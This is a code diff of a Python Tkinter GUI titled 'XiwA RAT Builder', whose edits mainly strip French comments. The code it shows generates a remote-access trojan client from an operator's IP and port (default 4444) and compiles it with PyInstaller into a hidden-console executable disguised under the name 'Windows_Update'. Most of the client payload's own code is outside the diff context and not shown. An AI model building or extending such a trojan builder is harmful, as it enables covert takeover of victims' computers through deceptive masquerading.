@@ -20,6 +20,7 @@ XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R
 
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
 import tkinter as tk
 from tkinter import ttk, messagebox
 import customtkinter as ctk
@@ -51,7 +52,6 @@ class BuilderGUI:
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("blue")
 
-        # Titre animé
         self.title_label = ctk.CTkLabel(
             self.root,
             text="XiwA RAT Builder",
@@ -61,7 +61,6 @@ class BuilderGUI:
         self.title_label.pack(pady=30)
         self.animate_title()
 
-        # Container principal avec coins arrondis
         self.main_frame = ctk.CTkFrame(
             self.root,
             corner_radius=20,
@@ -69,7 +68,6 @@ class BuilderGUI:
         )
         self.main_frame.pack(side="left", padx=20, pady=20, fill="both", expand=True)
 
-        # Frame pour l'écran
         self.screen_frame = ctk.CTkFrame(
             self.root,
             corner_radius=20,
@@ -78,7 +76,6 @@ class BuilderGUI:
         )
         self.screen_frame.pack(side="right", padx=20, pady=20, fill="both")
 
-        # Zone de visualisation
         self.screen_label = ctk.CTkLabel(
             self.screen_frame,
             text="Écran de visualisation",
@@ -96,13 +93,11 @@ class BuilderGUI:
         )
         self.screen_canvas.pack(pady=10)
 
-        # IP, Port et Pseudo
         self.ip_entry = self.create_entry("Votre IP:", "red")
         self.pseudo_entry = self.create_entry("Votre Pseudo:", "red") 
         self.port_entry = self.create_entry("Port:", "red")
         self.port_entry.insert(0, "4444")
 
-        # Options avancées
         options_label = ctk.CTkLabel(
             self.main_frame,
             text="Options avancées",
@@ -136,14 +131,12 @@ class BuilderGUI:
             )
             cb.pack(pady=5)
 
-        # Boutons de contrôle
         self.buttons_frame = ctk.CTkFrame(
             self.main_frame,
             fg_color="transparent"
         )
         self.buttons_frame.pack(pady=20)
 
-        # Bouton de génération animé
         self.build_btn = ctk.CTkButton(
             self.buttons_frame,
             text="GÉNÉRER LE RAT",
@@ -157,7 +150,6 @@ class BuilderGUI:
         )
         self.build_btn.pack(side="left", padx=10)
 
-        # Bouton de compilation
         self.compile_btn = ctk.CTkButton(
             self.buttons_frame,
             text="COMPILER .EXE",
@@ -171,7 +163,6 @@ class BuilderGUI:
         )
         self.compile_btn.pack(side="left", padx=10)
 
-        # Barre de progression stylisée
         self.progress = ctk.CTkProgressBar(
             self.main_frame,
             mode="determinate",
@@ -214,12 +205,11 @@ class BuilderGUI:
             self.progress.set(0)
             self.root.update_idletasks()
 
-            # Ajout des options de compilation sans l'icône
             PyInstaller.__main__.run([
                 '--onefile',
                 '--noconsole',
                 '--name=Windows_Update',
-                '--add-data=client.py;.',  # Inclut le fichier client.py dans l'exe
+                '--add-data=client.py;.',
                 'client.py'
             ])
 
@@ -244,7 +234,6 @@ class BuilderGUI:
             messagebox.showerror("Erreur", "Veuillez remplir tous les champs")
             return
 
-        # Code du RAT client avec contrôle total
         client_code = f"""
 import socket
 import subprocess
@@ -346,7 +335,6 @@ if __name__ == '__main__':
     main()
 """
 
-        # Sauvegarde du code dans le même répertoire que l'exécutable
         script_dir = os.path.dirname(os.path.abspath(__file__))
         client_path = os.path.join(script_dir, "client.py")
         
